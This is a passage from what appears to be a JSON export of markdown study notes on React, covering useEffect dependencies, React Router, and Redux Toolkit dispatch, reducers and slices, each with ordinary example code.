References\n\n- [React Docs: useMemo](https://react.dev/reference/react/useMemo)\n- [React Docs: Performance Optimization](https://react.dev/learn/render-and-commit#optimizing-performance)\n- [When to useMemo and useCallback](https://kentcdodds.com/blog/usememo-and-usecallback)\n\n---\n\n## Summary\n\n**useMemo in one line:** Cache expensive calculations between renders\n\n**Syntax:**\n```javascript\nconst memoizedValue = useMemo(() => expensiveFunc(a, b), [a, b]);\n```\n\n**Rule of thumb:** Only use when you have a proven performance problem. Profile first, optimize second."
    },
    {
      "id": "swe/frontend/react/hooks/useEffect-dependency-list",
      "title": "React useEffect Dependency List: A Well-Structured Overview",
      "path": [
        "swe",
        "frontend",
        "react",
        "hooks",
        "useEffect-dependency-list"
      ],
      "content": "# React useEffect Dependency List: A Well-Structured Overview\n\nThe dependency list in React’s `useEffect` hook determines when the effect runs by specifying which values to watch for changes. Understanding how to use and manage this list is crucial for writing predictable, efficient React components.\n\n## Key Points\n\n- **Purpose:** Controls when the effect runs—on mount, on update, or on specific value changes.\n- **Syntax:** `useEffect(effectFn, [dep1, dep2, ...])`\n- **Empty Array:** Runs effect only once after initial render (componentDidMount).\n- **No Array:** Runs effect after every render (not recommended for most cases).\n- **Specific Dependencies:** Runs effect when any listed dependency changes.\n- **Reference Equality:** Dependencies are compared using reference equality (`===`).\n- **Best Practices:** Always include all values used inside the effect in the dependency list.\n\n## Step-by-Step Explanation & Examples\n\n1. **Run Once on Mount**\n   ```js\n   useEffect(() => {\n     // Runs only once after initial render\n     fetchData();\n   }, []);\n   ```\n\n2. **Run on Specific Value Change**\n   ```js\n   useEffect(() => {\n     // Runs when 'userId' changes\n     fetchUser(userId);\n   }, [userId]);\n   ```\n\n3. **Run on Multiple Dependencies**\n   ```js\n   useEffect(() => {\n     // Runs when either 'a' or 'b' changes\n     calculate(a, b);\n   }, [a, b]);\n   ```\n\n4. **No Dependency Array**\n   ```js\n   useEffect(() => {\n     // Runs after every render\n     logRender();\n   });\n   ```\n\n5. **Reference Equality Example**\n   ```js\n   const obj = { value: 1 };\n   useEffect(() => {\n     // Will not re-run unless 'obj' reference changes\n     doSomething(obj);\n   }, [obj]);\n   ```\n\n## Common Pitfalls\n\n- Omitting dependencies used inside the effect, causing stale values or bugs.\n- Including functions or objects that change on every render, causing infinite loops.\n- Misunderstanding reference equality—new objects/arrays/functions trigger effects.\n- Overusing effects for logic that could be handled elsewhere (e.g., in event handlers).\n\n## Practical Applications\n\n- Fetching data when a parameter changes.\n- Subscribing/unsubscribing to events or sockets.\n- Synchronizing state with props or external sources.\n- Triggering animations or side effects on specific changes.\n\n## References\n\n- [React Docs: useEffect](https://react.dev/reference/react/useEffect)\n- [Kent C. Dodds: useEffect and Dependencies](https://kentcdodds.com/blog/useeffect-and-friends)\n- [Overreacted: A Complete Guide to useEffect](https://overreacted.io/a-complete-guide-to-useeffect/)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Custom Hooks:** Encapsulate effect logic and dependency management for reuse.\n- **Memoization:** Use `useCallback` and `useMemo` to stabilize function/object references in dependencies.\n- **Linting:** Use eslint-plugin-react-hooks to enforce correct dependency lists.\n- **Cleanup Functions:** Return a function from `useEffect` to clean up subscriptions or timers.\n- **Derived State:** Avoid unnecessary effects by computing derived state outside of"
    },
    {
      "id": "swe/frontend/react/react-routing",
      "title": "React Routing: A Well-Structured Overview",
      "path": [
        "swe",
        "frontend",
        "react",
        "react-routing"
      ],
      "content": "# React Routing: A Well-Structured Overview\n\nReact routing enables navigation between different views or pages in single-page applications (SPAs) by mapping URL paths to React components, creating a seamless multi-page experience without full page reloads.\n\n## Key Points\n\n- **Definition:** A mechanism to handle navigation and URL management in React applications, most commonly implemented using React Router library.\n- **Client-Side Navigation:** Routes change in the browser without server requests, providing instant transitions and preserving application state.\n- **Component-Based:** Each route renders specific React components, matching the component architecture paradigm.\n- **Nested Routes:** Support hierarchical routing structures with parent and child routes for complex layouts.\n- **Dynamic Routing:** Route parameters and query strings enable data-driven navigation (e.g., `/users/:id`).\n- **History Management:** Browser history API integration enables back/forward navigation and programmatic route changes.\n- **Code Splitting:** Lazy loading routes reduces initial bundle size and improves performance.\n\n## Step-by-Step Explanation & Examples\n\n1. **Installing React Router**\n   ```bash\n   npm install react-router-dom\n   # or\n   yarn add react-router-dom\n   ```\n\n2. **Basic Route Setup**\n   ```jsx\n   import { BrowserRouter, Routes, Route } from 'react-router-dom';\n   import Home from './pages/Home';\n   import About from './pages/About';\n   import Contact from './pages/Contact';\n\n   function App() {\n     return (\n       <BrowserRouter>\n         <Routes>\n           <Route path=\"/\" element={<Home />} />\n           <Route path=\"/about\" element={<About />} />\n           <Route path=\"/contact\" element={<Contact />} />\n         </Routes>\n       </BrowserRouter>\n     );\n   }\n   ```\n\n3. **Navigation with Links**\n   ```jsx\n   import { Link, NavLink } from 'react-router-dom';\n\n   function Navigation() {\n     return (\n       <nav>\n         <Link to=\"/\">Home</Link>\n         <Link to=\"/about\">About</Link>\n         \n         {/* NavLink adds 'active' class to current route */}\n         <NavLink to=\"/contact\" className={({ isActive }) => \n           isActive ? 'nav-link active' : 'nav-link'\n         }>\n           Contact\n         </NavLink>\n       </nav>\n     );\n   }\n   ```\n\n4. **Dynamic Routes with Parameters**\n   ```jsx\n   // Route definition\n   <Route path=\"/users/:userId\" element={<UserProfile />} />\n\n   // Accessing params in component\n   import { useParams } from 'react-router-dom';\n\n   function UserProfile() {\n     const { userId } = useParams();\n     \n     return <h1>User Profile: {userId}</h1>;\n   }\n\n   // Navigation to dynamic route\n   <Link to=\"/users/123\">View User 123</Link>\n   ```\n\n5. **Nested Routes with Layouts**\n   ```jsx\n   import { Outlet } from 'react-router-dom';\n\n   function DashboardLayout() {\n     return (\n       <div>\n         <aside>Sidebar</aside>\n         <main>\n           <Outlet /> {/* Child routes render here */}\n         </main>\n       </div>\n     );\n   }\n\n   // Route configuration\n   <Route path=\"/dashboard\" element={<DashboardLayout />}>\n     <Route index element={<DashboardHome />} />\n     <Route path=\"profile\" element={<Profile />} />\n     <Route path=\"settings\" element={<Settings />} />\n   </Route>\n   ```\n\n6. **Programmatic Navigation**\n   ```jsx\n   import { useNavigate } from 'react-router-dom';\n\n   function LoginForm() {\n     const navigate = useNavigate();\n\n     const handleSubmit = async (e) => {\n       e.preventDefault();\n       await loginUser();\n       navigate('/dashboard'); // Redirect after login\n       \n       // Navigate with state\n       navigate('/profile', { state: { from: 'login' } });\n       \n       // Go back\n       navigate(-1);\n     };\n\n     return <form onSubmit={handleSubmit}>...</form>;\n   }\n   ```\n\n7. **Protected Routes**\n   ```jsx\n   import { Navigate } from 'react-router-dom';\n\n   function ProtectedRoute({ children }) {\n     const isAuthenticated = useAuth();\n     \n     return isAuthenticated ? children : <Navigate to=\"/login\" />;\n   }\n\n   // Usage\n   <Route \n     path=\"/dashboard\" \n     element={\n       <ProtectedRoute>\n         <Dashboard />\n       </ProtectedRoute>\n     } \n   />\n   ```\n\n8. **Lazy Loading Routes**\n   ```jsx\n   import { lazy, Suspense } from 'react';\n\n   const Dashboard = lazy(() => import('./pages/Dashboard'));\n   const Profile = lazy(() => import('./pages/Profile'));\n\n   function App() {\n     return (\n       <BrowserRouter>\n         <Suspense fallback={<div>Loading...</div>}>\n           <Routes>\n             <Route path=\"/\" element={<Home />} />\n             <Route path=\"/dashboard\" element={<Dashboard />} />\n             <Route path=\"/profile\" element={<Profile />} />\n           </Routes>\n         </Suspense>\n       </BrowserRouter>\n     );\n   }\n   ```\n\n## Common Pitfalls\n\n- Using `<a>` tags instead of `<Link>` components, causing full page reloads and losing application state.\n- Forgetting to wrap the app with `<BrowserRouter>`, causing hooks like `useNavigate` to fail.\n- Not handling 404 routes, leaving users on blank pages for invalid URLs.\n- Placing `<Routes>` outside of `<BrowserRouter>`, which breaks routing context.\n- Over-nesting routes unnecessarily, making the routing structure harder to maintain.\n- Not considering URL structure for SEO and user bookmarking—routes should be meaningful and shareable.\n- Forgetting to add `index` prop for default child routes in nested routing scenarios.\n\n## Practical Applications\n\n- **Multi-Page SPAs:** Create distinct sections (home, dashboard, settings) without traditional page loads.\n- **E-commerce Sites:** Product listings, detail pages, cart, and checkout flows with persistent navigation.\n- **Admin Dashboards:** Nested layouts with sidebars and multiple sub-sections for different management areas.\n- **Authentication Flows:** Login, signup, password reset with redirects based on authentication state.\n\n**Example anecdote:** On a photo gallery app, we initially loaded all images upfront, making the initial load painfully slow. By implementing lazy-loaded routes for each gallery section (`/nature`, `/urban`, `/portraits`), we cut the initial bundle from 2MB to 300KB. Users on the homepage didn't download gallery code until they actually navigated to a gallery—a huge win for mobile users.\n\n## References\n\n- [React Router Official Documentation](https://reactrouter.com/)\n- [React Router v6 Migration Guide](https://reactrouter.com/en/main/upgrading/v5)\n- [React.dev: Adding React Router](https://react.dev/learn/start-a-new-react-project#react-router)\n- [Code Splitting with React Router](https://reactrouter.com/en/main/route/lazy)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Router Types:**\n  - **BrowserRouter:** Uses HTML5 history API, clean URLs (`/about`), requires server configuration\n  - **HashRouter:** Uses URL hash (`/#/about`), works without server config but less SEO-friendly\n  - **MemoryRouter:** In-memory routing for testing or non-browser environments\n- **Search Parameters (Query Strings):**\n  ```jsx\n  import { useSearchParams } from 'react-router-dom';\n  \n  function SearchResults() {\n    const [searchParams, setSearchParams] = useSearchParams();\n    const query = searchParams.get('q');\n    const page = searchParams.get('page') || '1';\n    \n    // Update query params\n    setSearchParams({ q: 'new search', page: '2' });\n  }\n  ```\n- **Location State:** Pass data between routes without exposing it in the URL:\n  ```jsx\n  // Sending state\n  navigate('/profile', { state: { userId: 123, source: 'dashboard' } });\n  \n  // Receiving state\n  const location = useLocation();\n  const { userId, source } = location.state || {};\n  ```\n- **Route Loaders (React Router 6.4+):** Fetch data before rendering routes for better UX:\n  ```jsx\n  const router = createBrowserRouter([\n    {\n      path: '/users/:id',\n      element: <UserProfile />,\n      loader: async ({ params }) => {\n        const user = await fetchUser(params.id);\n        return user;\n      }\n    }\n  ]);\n  \n  // In component\n  const user = useLoaderData();\n  ```\n- **Route Actions:** Handle form submissions and mutations declaratively:\n  ```jsx\n  {\n    path: '/users/:id/edit',\n    element: <EditUser />,\n    action: async ({ request, params }) => {\n      const formData = await request.formData();\n      await updateUser(params.id, formData);\n      return redirect(`/users/${params.id}`);\n    }\n  }\n  ```\n- **Error Boundaries for Routes:** Handle routing errors gracefully:\n  ```jsx\n  <Route \n    path=\"/dashboard\" \n    element={<Dashboard />}\n    errorElement={<ErrorPage />}\n  />\n  ```\n- **Relative Links and Routes:** Simplify nested navigation with relative paths:\n  ```jsx\n  // In /dashboard/settings\n  <Link to=\"..\">Back to Dashboard</Link>  // Goes to /dashboard\n  <Link to=\"../profile\">Profile</Link>    // Goes to /dashboard/profile\n  ```\n- **Route Matching Priority:** React Router matches routes in order—more specific routes should come before generic ones:\n  ```jsx\n  <Route path=\"/users/new\" element={<NewUser />} />\n  <Route path=\"/users/:id\" element={<UserProfile />} />  // Must come after\n  ```\n- **Scroll Restoration:** Automatically scroll to top on route changes or preserve scroll position:\n  ```jsx\n  import { useEffect } from 'react';\n  import { useLocation } from 'react-router-dom';\n  \n  function ScrollToTop() {\n    const { pathname } = useLocation();\n    \n    useEffect(() => {\n      window.scrollTo(0, 0);\n    }, [pathname]);\n    \n    return null;\n  }\n  ```\n- **Path Wildcards:** Catch-all routes for 404 pages:\n  ```jsx\n  <Route path=\"*\" element={<NotFound />} />\n  ```\n- **Base URL Configuration:** For apps deployed in subdirectories:\n  ```jsx\n  <BrowserRouter basename=\"/my-app\">\n    <Routes>...</Routes>\n  </BrowserRouter>\n  ```\n- **Testing Routes:** Use `MemoryRouter` for isolated route testing:\n  ```jsx\n  import { render } from '@testing-library/react';\n  import { MemoryRouter } from 'react-router-dom';\n  \n  render(\n    <MemoryRouter initialEntries={['/users/123']}>\n      <App />\n    </MemoryRouter>\n  );\n  ```\n- **Server-Side Rendering (SSR):** Use `StaticRouter` for SSR with frameworks like Next.js or Remix.\n- **Route-Based Code Organization:** Structure folders by feature/route for better maintainability:\n  ```\n  src/\n    routes/\n      home/\n        Home.jsx\n        home.test.jsx\n      dashboard/\n        Dashboard.jsx\n        components/\n        hooks/\n  ```\n- **Navigation Guards:** Execute logic before route changes (authentication checks, unsaved changes warnings).\n- **Prompt for Unsaved Changes:** Warn users before navigating away from forms with unsaved data using `useBlocker` hook."
    },
    {
      "id": "swe/frontend/react/redux/redux-dispatch",
      "title": "React Redux Toolkit dispatch(): Complete Overview",
      "path": [
        "swe",
        "frontend",
        "react",
        "redux",
        "redux-dispatch"
      ],
      "content": "# React Redux Toolkit dispatch(): Complete Overview\n\nThe `dispatch()` function in React Redux Toolkit is used to send actions to the Redux store, triggering state updates. It's the primary way components interact with Redux state, allowing you to execute synchronous actions (reducers) or asynchronous logic (thunks). Think of it as pressing a button that tells your app's central state manager to do something.\n\n## Key Points\n\n- **Purpose:** Sends actions to Redux store to update state\n- **Usage:** Call `dispatch(action)` or `dispatch(actionCreator())`\n- **Async Support:** Handles thunks for async operations (API calls, timers)\n- **Type Safety:** Fully typed in TypeScript when properly configured\n- **Access:** Get via `useDispatch()` hook in components\n\n## Step-by-Step Explanation & Examples\n\n1. **Basic Dispatch (Synchronous Action)**\n\n   ```js\n   import { useDispatch } from 'react-redux';\n   import { increment } from './counterSlice';\n\n   function Counter() {\n     const dispatch = useDispatch();\n     \n     return <button onClick={() => dispatch(increment())}>+1</button>;\n     // State updates immediately via reducer\n   }\n   ```\n\n2. **Dispatch with Payload**\n\n   ```js\n   import { addTodo } from './todosSlice';\n\n   function TodoForm() {\n     const dispatch = useDispatch();\n     \n     const handleSubmit = (text) => {\n       dispatch(addTodo({ id: Date.now(), text, completed: false }));\n     };\n   }\n   ```\n\n3. **Async Thunk Dispatch**\n\n   ```js\n   import { fetchUser } from './userSlice';\n\n   function UserProfile() {\n     const dispatch = useDispatch();\n     \n     useEffect(() => {\n       dispatch(fetchUser(userId)); // Async action creator\n     }, [dispatch, userId]);\n   }\n   \n   // In userSlice.js\n   export const fetchUser = createAsyncThunk(\n     'user/fetch',\n     async (userId) => {\n       const response = await api.getUser(userId);\n       return response.data;\n     }\n   );\n   ```\n\n4. **Dispatching Multiple Actions**\n\n   ```js\n   const handleCheckout = () => {\n     dispatch(clearCart());\n     dispatch(createOrder(cartItems));\n     dispatch(showSuccessMessage('Order placed!'));\n   };\n   ```\n\n5. **Conditional Dispatch (Thunk Pattern)**\n   ```js\n   export const incrementIfOdd = () => (dispatch, getState) => {\n     const { counter } = getState();\n     if (counter.value % 2 === 1) {\n       dispatch(increment());\n     }\n   };\n   ```\n\n## Common Pitfalls\n\n- Forgetting to call action creators: `dispatch(increment)` ❌ vs `dispatch(increment())` ✅\n- Dispatching inside render (causes infinite loops) - use `useEffect` or event handlers\n- Not handling thunk errors with `.unwrap()` or rejected cases\n- Mutating state directly instead of dispatching actions\n\n## Practical Applications\n\n- Form submissions (dispatch actions with user input)\n- API calls (fetch/post data with async thunks)\n- UI state changes (modals, notifications, filters)\n- Multi-step workflows (checkout, onboarding flows)\n\n## References\n\n- [Redux Toolkit: Dispatching Actions](https://redux-toolkit.js.org/usage/usage-guide#dispatching-actions)\n- [React Redux: useDispatch Hook](https://react-redux.js.org/api/hooks#usedispatch)\n- [Redux Toolkit: createAsyncThunk](https://redux-toolkit.js.org/api/createAsyncThunk)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Typed Dispatch:** TypeScript users should type dispatch with `AppDispatch` for thunk support:\n  ```ts\n  export const useAppDispatch = () => useDispatch<AppDispatch>();\n  ```\n\n- **Batch Dispatching:** Multiple dispatches are automatically batched in React 18+ for performance\n\n- **Thunk Lifecycle:** Async thunks dispatch `pending`, `fulfilled`, and `rejected` actions automatically\n\n- **Optimistic Updates:** Dispatch optimistically, rollback on error:\n  ```js\n  dispatch(likePost(postId));\n  try {\n    await api.likePost(postId);\n  } catch (error) {\n    dispatch(unlikePost(postId)); // Rollback\n  }\n  ```\n\n- **DevTools Integration:** All dispatched actions appear in Redux DevTools for debugging with time-travel capabilities"
    },
    {
      "id": "swe/frontend/react/redux/redux-intro",
      "title": "React Redux: A Concise Overview",
      "path": [
        "swe",
        "frontend",
        "react",
        "redux",
        "redux-intro"
      ],
      "content": "# React Redux: A Concise Overview\n\nRedux is a predictable state container for JavaScript apps, commonly used with React to manage application state in a centralized, consistent way.\n\n## Key Points\n\n- **Centralized State:** Redux stores all application state in a single object.\n- **Unidirectional Data Flow:** State changes via dispatched actions and reducers.\n- **Pure Functions:** Reducers are pure functions that determine state updates.\n- **Middleware Support:** Redux can handle async logic and side effects via middleware (e.g., redux-thunk).\n- **React Integration:** The `react-redux` library connects Redux state to React components.\n\n## Step-by-Step Explanation\n\n1. **Create a Redux Store**\n   ```js\n   import { createStore } from 'redux';\n   const store = createStore(reducer);\n   ```\n\n2. **Define Actions**\n   ```js\n   const increment = { type: 'INCREMENT' };\n   ```\n\n3. **Write a Reducer**\n   ```js\n   function counter(state = 0, action) {\n     switch (action.type) {\n       case 'INCREMENT':\n         return state + 1;\n       default:\n         return state;\n     }\n   }\n   ```\n\n4. **Connect React Components**\n   ```js\n   import { Provider, useSelector, useDispatch } from 'react-redux';\n\n   function Counter() {\n     const count = useSelector(state => state);\n     const dispatch = useDispatch();\n     return (\n       <button onClick={() => dispatch({ type: 'INCREMENT' })}>\n         {count}\n       </button>\n     );\n   }\n   ```\n\n## Common Pitfalls\n\n- **Mutating State:** Always return new state objects in reducers; never mutate.\n- **Overusing Redux:** Use Redux only for global/shared state, not for local UI state.\n- **Forgetting to Wrap with `<Provider>`:** React components need access to the Redux store via the Provider.\n\n## Practical Applications\n\n- Managing global UI state (e.g., authentication, theme).\n- Handling complex state transitions.\n- Sharing state across deeply nested components.\n\n## References\n\n- [Redux Official Documentation](https://redux.js.org/)\n- [React Redux Documentation](https://react-redux.js.org/)\n-"
    },
    {
      "id": "swe/frontend/react/redux/redux-reducers-extra-reducers",
      "title": "Redux Toolkit Reducers vs Extra Reducers: Complete Overview",
      "path": [
        "swe",
        "frontend",
        "react",
        "redux",
        "redux-reducers-extra-reducers"
      ],
      "content": "# Redux Toolkit Reducers vs Extra Reducers: Complete Overview\n\nReducers and extra reducers in Redux Toolkit are functions that specify how application state changes in response to actions. Regular reducers handle actions defined within the same slice, while extra reducers handle actions from other slices or async thunks. Think of reducers as your own department handling internal tasks, while extra reducers are like interdepartmental coordination—responding to events happening in other parts of your application.\n\n## Key Points\n\n- **Reducers:** Handle actions defined in the same slice, auto-generate action creators\n- **Extra Reducers:** Handle external actions (other slices, thunks), no action creators\n- **Syntax:** Reducers use object notation, extra reducers use builder pattern\n- **Immer:** Both use Immer for safe \"mutating\" syntax\n- **Use Cases:** Reducers for local state, extra reducers for shared/async state\n\n## High-Level Overview\n\n### What are Reducers?\n\nReducers are functions defined within a slice that handle actions specific to that slice. They automatically generate action creators and manage local state.\n\n```typescript\ncreateSlice({\n  name: 'counter',\n  initialState: { value: 0 },\n  reducers: {\n    increment(state) {\n      state.value += 1;  // Immer makes this safe\n    }\n  }\n});\n```\n\n### What are Extra Reducers?\n\nExtra reducers handle actions from outside the slice—async thunks, other slices, or external action creators. They don't generate action creators.\n\n```typescript\ncreateSlice({\n  name: 'notifications',\n  initialState: { list: [] },\n  reducers: {},\n  extraReducers: (builder) => {\n    builder.addCase(userLoggedIn, (state, action) => {\n      state.list.push('User logged in!');\n    });\n  }\n});\n```\n\n## Similarities\n\nBoth reducers and extra reducers share core characteristics:\n\n### 1. Immutable Updates with Immer\n\n```typescript\nconst slice = createSlice({\n  name: 'example',\n  initialState: { count: 0 },\n  reducers: {\n    increment(state) {\n      state.count += 1;  // Safe \"mutation\"\n    }\n  },\n  extraReducers: (builder) => {\n    builder.addCase(someAction, (state) => {\n      state.count += 1;  // Same Immer magic\n    });\n  }\n});\n```\n\n### 2. Same Function Signature\n\n```typescript\n// Both receive state and action\nreducers: {\n  update(state, action: PayloadAction<number>) {\n    state.value = action.payload;\n  }\n},\nextraReducers: (builder) => {\n  builder.addCase(externalAction, (state, action: PayloadAction<number>) => {\n    state.value = action.payload;\n  });\n}\n```\n\n### 3. Must Be Pure Functions\n\n```typescript\n// ✅ Good - no side effects\nreducers: {\n  addItem(state, action) {\n    state.items.push(action.payload);\n  }\n}\n\n// ❌ Bad - side effects\nreducers: {\n  addItem(state, action) {\n    state.items.push(action.payload);\n    fetch('/api/track');  // ❌ Use middleware/thunks\n  }\n}\n```\n\n## Differences\n\n### 1. Action Creator Generation\n\n```typescript\nconst slice = createSlice({\n  name: 'counter',\n  initialState: { value: 0 },\n  reducers: {\n    increment(state) { }  // ✅ Generates slice.actions.increment()\n  },\n  extraReducers: (builder) => {\n    builder.addCase(externalAction, (state) => { });  // ❌ No action creator\n  }\n});\n\n// Usage\ndispatch(slice.actions.increment());  // ✅ Works\ndispatch(slice.actions.externalAction());  // ❌ Doesn't exist\n```\n\n### 2. Syntax\n\n```typescript\n// Reducers: Object notation\nreducers: {\n  increment(state) { },\n  decrement(state) { }\n}\n\n// Extra Reducers: Builder pattern\nextraReducers: (builder) => {\n  builder\n    .addCase(action1, (state) => { })\n    .addMatcher(isPending, (state) => { });\n}\n```\n\n### 3. Source of Actions\n\n```typescript\n// Reducers: Handle OWN actions\nconst counterSlice = createSlice({\n  name: 'counter',\n  reducers: {\n    increment(state) { }  // Handles counter/increment\n  }\n});\n\n// Extra Reducers: Handle EXTERNAL actions\nconst notificationsSlice = createSlice({\n  name: 'notifications',\n  extraReducers: (builder) => {\n    builder.addCase(counterSlice.actions.increment, (state) => {\n      // Responds to counter/increment from different slice\n    });\n  }\n});\n```\n\n### 4. Use Cases\n\n```typescript\n// Reducers: Internal state management\nreducers: {\n  toggleSidebar(state) {\n    state.sidebarOpen = !state.sidebarOpen;\n  },\n  updateForm(state, action) {\n    state.form[action.payload.field] = action.payload.value;\n  }\n}\n\n// Extra Reducers: Cross-cutting concerns\nextraReducers: (builder) => {\n  builder\n    .addCase(fetchData.fulfilled, (state, action) => {\n      state.data = action.payload;\n    })\n    .addCase(logout, (state) => {\n      return initialState;  // Reset on logout\n    });\n}\n```\n\n### 5. Flexibility\n\n```typescript\n// Reducers: Simple object keys only\nreducers: {\n  action1(state) { },\n  action2(state) { }\n}\n\n// Extra Reducers: Matchers and default cases\nextraReducers: (builder) => {\n  builder\n    .addCase(action, handler)\n    .addMatcher(isPending, handler)\n    .addDefaultCase(handler);\n}\n```\n\n## Common Examples\n\n### Basic Reducers\n\n```typescript\ninterface CounterState {\n  value: number;\n}\n\nconst counterSlice = createSlice({\n  name: 'counter',\n  initialState: { value: 0 } as CounterState,\n  reducers: {\n    increment(state) {\n      state.value += 1;\n    },\n    decrement(state) {\n      state.value -= 1;\n    },\n    incrementByAmount(state, action: PayloadAction<number>) {\n      state.value += action.payload;\n    },\n    reset() {\n      return { value: 0 };\n    }\n  }\n});\n\nexport const { increment, decrement, incrementByAmount, reset } = counterSlice.actions;\n\n// Usage\ndispatch(increment());\ndispatch(incrementByAmount(5));\n```\n\n### Async Thunks with Extra Reducers\n\n```typescript\ninterface UsersState {\n  users: User[];\n  loading: boolean;\n  error: string | null;\n}\n\nexport const fetchUsers = createAsyncThunk(\n  'users/fetchUsers',\n  async () => {\n    const response = await fetch('/api/users');\n    return response.json();\n  }\n);\n\nconst usersSlice = createSlice({\n  name: 'users',\n  initialState: {\n    users: [],\n    loading: false,\n    error: null\n  } as UsersState,\n  reducers: {\n    clearError(state) {\n      state.error = null;\n    }\n  },\n  extraReducers: (builder) => {\n    builder\n      .addCase(fetchUsers.pending, (state) => {\n        state.loading = true;\n        state.error = null;\n      })\n      .addCase(fetchUsers.fulfilled, (state, action) => {\n        state.loading = false;\n        state.users = action.payload;\n      })\n      .addCase(fetchUsers.rejected, (state, action) => {\n        state.loading = false;\n        state.error = action.error.message || 'Failed to fetch';\n      });\n  }\n});\n```\n\n### Cross-Slice Communication\n\n```typescript\n// authSlice.ts\nconst authSlice = createSlice({\n  name: 'auth',\n  initialState: { user: null },\n  reducers: {\n    logout(state) {\n      state.user = null;\n    }\n  }\n});\n\nexport const { logout } = authSlice.actions;\n\n// cartSlice.ts\nconst cartSlice = createSlice({\n  name: 'cart',\n  initialState: { items: [] },\n  reducers: {\n    addItem(state, action: PayloadAction<CartItem>) {\n      state.items.push(action.payload);\n    }\n  },\n  extraReducers: (builder) => {\n    // Clear cart when user logs out\n    builder.addCase(logout, (state) => {\n      state.items = [];\n    });\n  }\n});\n```\n\n### Using Matchers\n\n```typescript\nconst todosSlice = createSlice({\n  name: 'todos',\n  initialState: {\n    todos: [] as Todo[],\n    loading: false,\n    error: null as string | null\n  },\n  reducers: {},\n  extraReducers: (builder) => {\n    builder\n      // Match all pending actions\n      .addMatcher(\n        isPending(fetchTodos, createTodo, updateTodo),\n        (state) => {\n          state.loading = true;\n          state.error = null;\n        }\n      )\n      // Match all fulfilled actions\n      .addMatcher(\n        isFulfilled(fetchTodos, createTodo, updateTodo),\n        (state) => {\n          state.loading = false;\n        }\n      )\n      // Match all rejected actions\n      .addMatcher(\n        isRejected(fetchTodos, createTodo, updateTodo),\n        (state, action) => {\n          state.loading = false;\n          state.error = action.error.message || 'Error occurred';\n        }\n      );\n  }\n});\n```\n\n### Prepare Callback (Advanced Reducers)\n\n```typescript\nconst todosSlice = createSlice({\n  name: 'todos',\n  initialState: [] as Todo[],\n  reducers: {\n    addTodo: {\n      reducer(state, action: PayloadAction<Todo>) {\n        state.push(action.payload);\n      },\n      prepare(text: string) {\n        return {\n          payload: {\n            id: crypto.randomUUID(),\n            text,\n            completed: false,\n            createdAt: new Date().toISOString()\n          }\n        };\n      }\n    }\n  }\n});\n\n// Usage - only pass text, prepare generates full object\ndispatch(addTodo('Buy groceries'));\n```\n\n## Common Pitfalls\n\n- Using reducers for async logic (use createAsyncThunk instead)\n- Not handling all thunk states (pending, fulfilled, rejected)\n- Mutating state outside Immer context\n- Using deprecated extraReducers object syntax (use builder)\n- Forgetting to export action creators from reducers\n- Creating circular dependencies between slices\n\n## Practical Applications\n\n**Reducers:**\n- Form state updates\n- UI toggles (modals, sidebars)\n- Filtering and sorting\n- Adding/removing items from lists\n\n**Extra Reducers:**\n- API data fetching\n- Authentication flow\n- Global loading states\n- Resetting state on logout\n- Cross-slice synchronization\n\n## Quick Decision Guide\n\n```\nUse REDUCERS when:\n✅ Action is specific to this slice\n✅ Need auto-generated action creator\n✅ Simple synchronous state update\n\nUse EXTRA REDUCERS when:\n✅ Handling async thunks\n✅ Responding to other slices' actions\n✅ Need matchers or default cases\n✅ Cross-slice coordination needed\n```\n\n## Best Practices\n\n```typescript\n// ✅ Good: Clear separation\nconst slice = createSlice({\n  name: 'todos',\n  initialState,\n  reducers: {\n    // Local actions only\n    addTodo(state, action) { },\n    toggleTodo(state, action) { }\n  },\n  extraReducers: (builder) => {\n    // External actions only\n    builder\n      .addCase(fetchTodos.fulfilled, (state, action) => { })\n      .addCase(logout, () => initialState);\n  }\n});\n\n// ✅ Good: Handle all async states\nextraReducers: (builder) => {\n  builder\n    .addCase(fetchData.pending, (state) => {\n      state.loading = true;\n    })\n    .addCase(fetchData.fulfilled, (state, action) => {\n      state.loading = false;\n      state.data = action.payload;\n    })\n    .addCase(fetchData.rejected, (state, action) => {\n      state.loading = false;\n      state.error = action.error.message;\n    });\n}\n\n// ✅ Good: Use matchers for patterns\nextraReducers: (builder) => {\n  builder.addMatcher(\n    isPending(fetchA, fetchB, fetchC),\n    (state) => { state.loading = true; }\n  );\n}\n```\n\n## References\n\n- [Redux Toolkit: createSlice](https://redux-toolkit.js.org/api/createSlice)\n- [Redux Toolkit: createAsyncThunk](https://redux-toolkit.js.org/api/createAsyncThunk)\n- [Builder Callback API](https://redux-toolkit.js.org/api/createSlice#the-builder-callback-api)\n- [Immer Documentation](https://immerjs.github.io/immer/)"
    },
    {
      "id": "swe/frontend/react/redux/redux-slice",
      "title": "React Redux Slices: A Concise Overview",
      "path": [
        "swe",
        "frontend",
        "react",
        "redux",
        "redux-slice"
      ],
      "content": "# React Redux Slices: A Concise Overview\n\nRedux slices are a feature of Redux Toolkit that simplify state management by grouping related state, reducers, and actions into a single module. Slices make Redux code more modular, readable, and maintainable.\n\n## Key Points\n\n- **Modularity:** Slices encapsulate state, reducers, and actions for a specific feature.\n- **Automatic Action Creators:** Redux Toolkit generates action creators for each reducer in a slice.\n- **Immutability:** Slices use Immer under the hood, allowing you to write \\\"mutating\\\" code that is actually immutable.\n- **Simplified Setup:** Slices reduce boilerplate compared to traditional Redux.\n- **Integration:** Slices are combined in the store using `configureStore` and `combineReducers`.\n\n## Step-by-Step Explanation & Examples\n\n1. **Creating a Slice**\n   ```js\n   import { createSlice } from '@reduxjs/toolkit';\n\n   const counterSlice = createSlice({\n     name: 'counter',\n     initialState: { value: 0 },\n     reducers: {\n       increment: state => { state.value += 1; },\n       decrement: state => { state.value -= 1; },\n       addBy: (state, action) => { state.value += action.payload; }\n     }\n   });\n\n   export const { increment, decrement, addBy } = counterSlice.actions;\n   export default counterSlice.reducer;\n   ```\n\n2. **Adding Slices to the Store**\n   ```js\n   import { configureStore } from '@reduxjs/toolkit';\n   import counterReducer from './counterSlice';\n\n   const store = configureStore({\n     reducer: {\n       counter: counterReducer\n     }\n   });\n   ```\n\n3. **Using Slice Actions in Components**\n   ```js\n   import { useDispatch } from 'react-redux';\n   import { increment } from './counterSlice';\n\n   const MyComponent = () => {\n     const dispatch = useDispatch();\n     return <button onClick={() => dispatch(increment())}>Increment</button>;\n   };\n   ```\n\n## Common Pitfalls\n\n- Forgetting 